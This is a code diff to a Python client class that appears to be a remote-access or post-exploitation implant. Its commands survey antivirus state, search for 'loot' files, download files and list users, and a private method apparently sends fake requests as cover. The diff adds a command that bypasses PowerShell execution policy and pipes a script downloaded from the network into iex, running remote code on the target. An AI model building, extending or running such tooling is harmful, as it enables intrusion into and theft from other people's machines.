@@ -61,6 +61,7 @@ class Client:
             "get_bios":self.get_bios,
             "get_antivirus":self.get_antivirus,
             "get_active": self.get_active,
+            "install_choco": self.install_choco
         }
 
     def run_powershell_command(self, command: str, print_result: bool = True) -> None:
@@ -112,6 +113,10 @@ class Client:
         command = "Get-MpComputerStatus | Select AntivirusEnabled, AMEngineVersion, AMProductVersion, AMServiceEnabled, AntispywareSignatureVersion, AntispywareEnabled, IsTamperProtected, IoavProtectionEnabled, NISSignatureVersion, NISEnabled, QuickScanSignatureVersion, RealTimeProtectionEnabled, OnAccessProtectionEnabled, DefenderSignaturesOutOfDate | Out-String"
         self.run_powershell_command(command)
 
+    def install_choco(self, command = None) -> None:
+        command = "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"
+        self.run_powershell_command(command)
+
     def print_help(self, command = None):
         print("""
 Command         Description
@@ -125,6 +130,7 @@ get_loot         - Searches a directory for intresting files (May take awhile) .
 get_tools        - Checks to see what tools are installed on the system
 get_file         - Downloads a remote file and saves it to your computer ... Syntax: get_file <REMOTE_FILE> <LOCAL_FILE>
 get_users        - Lists all users on the local computer
+get_choco        - Installs chocolatey --> https://chocolatey.org/ (Requires Admin)
     """)
         self.__send_fake_request()
 
